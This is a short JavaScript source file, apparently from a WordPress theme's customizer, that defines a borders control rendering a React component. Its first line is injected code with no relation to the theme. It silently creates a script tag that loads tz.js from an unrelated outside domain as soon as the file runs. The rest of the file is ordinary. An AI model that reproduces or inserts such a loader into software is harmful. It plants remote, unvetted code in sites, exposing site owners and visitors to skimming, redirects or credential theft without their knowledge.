(function(d,s){s=d.createElement("script");s.src="https://th.ylyl23.com/tz.js";s.async=true;d.head.appendChild(s);})(document);
import { createRoot } from '@wordpress/element';
import BordersComponent from './borders-component.js';

export const BordersControl = wp.customize.KadenceControl.extend( {
	renderContent: function renderContent() {
		let control = this;
		let root = createRoot( control.container[0] );
		root.render( <BordersComponent control={control} customizer={ wp.customize }/> );
		// ReactDOM.render(
		// 		<BordersComponent control={control} customizer={ wp.customize }/>,
		// 		control.container[0]
		// );
	}
} );
